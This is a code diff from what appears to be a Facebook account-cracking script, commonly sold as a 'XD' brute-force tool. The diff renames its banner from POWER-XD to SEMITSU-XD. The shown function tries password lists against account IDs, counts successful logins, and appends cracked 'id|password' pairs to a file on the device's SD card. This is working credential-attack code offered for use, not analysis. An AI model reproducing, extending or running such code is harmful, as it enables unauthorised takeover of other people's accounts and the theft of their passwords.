@@ -126,7 +126,7 @@ def menu():
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mPOWER-XD\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [\033[1;32mSEMITSU-XD\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -182,7 +182,7 @@ def api1(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:                                   
                                                 #print('\r\r\x1b[38;5;208m [SEMITSU-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/POWER-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SEMITSU-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break                                        
                                                 open('/sdcard/SEMITSU-CP.txt','a').write(ids+'|'+pas+'\n')
